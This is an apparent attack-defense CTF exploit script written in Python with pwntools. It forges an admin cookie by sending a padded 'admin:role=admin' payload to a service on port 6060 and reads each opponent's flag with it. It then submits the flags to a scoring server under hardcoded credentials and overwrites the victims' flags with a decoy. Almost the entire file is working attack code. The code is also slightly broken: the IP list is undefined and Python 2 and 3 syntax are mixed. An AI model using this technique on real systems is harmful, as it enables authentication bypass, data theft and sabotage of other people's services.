from pwn import *
from time import sleep
import requests
import json

def submit(flag):
	print(flag)
	url = "http://10.115.0.2:8000/flag"
	data = json.dumps({"flag": flag})
	# if the team name is bi0s and password is bi0s - you need base64 of "bi0s:bi0s"
	header = {"Authorization": "Basic YmkwczpiaTBz"}
	r = requests.post(url, data=data, headers=header)
	print r.text 
	return
def get_cookie(ip,payload):
	conn = remote(ip,6060);sleep(0.1)
	a = conn.recv()
	conn.sendline('1');sleep(0.1)
	a = conn.recv()
	conn.sendline(payload);sleep(0.1)
	cookie = conn.recv();conn.close()
	return cookie.split(':')[1].strip(' ').strip('\n')

def read_flag(ip,cookie):
	conn = remote(ip,6060);sleep(0.1)
	a = conn.recv()
	conn.sendline('2');sleep(0.1)
	a = conn.recv()
	conn.sendline(cookie);sleep(0.1)
	a = conn.recv()
	conn.sendline('1');sleep(0.1)
	a = conn.recv();conn.close()
	out = [x.strip('\n').strip(' ') for x in a.split('\n')]
	for line in out:
		if line[:3] == 'FLG':
			return line
def write_flag(ip,cookie):
	conn = remote(ip,6060);sleep(0.1)
	a = conn.recv()
	conn.sendline('2');sleep(0.1)
	a = conn.recv()
	conn.sendline(cookie);sleep(0.1)
	a = conn.recv()
	conn.sendline('2');sleep(0.1)
	a = conn.recv()
	conn.sendline('FLG{flag is not here::Hehehe}');sleep(0.1)
	conn.close()
def Exploit(ip):
	print(ip)
	payload = "admin:role=admin"+'\x07'*7
	cookie = get_cookie(ip,payload)
	cookie = cookie[:96]
	flag   = read_flag(ip,cookie)
	submit(flag)
	write_flag(ip,cookie)
def start():
	global IPs
	for ip in IPs:
		try:
			Exploit(ip)
		except:
			print("Error with the ip addr :: "+ip)
def main():
  	start()
  	sleep(60) # Sleep for 60 sec which means it runs 3 times for 1 tick , it's not a problem at all.
main()
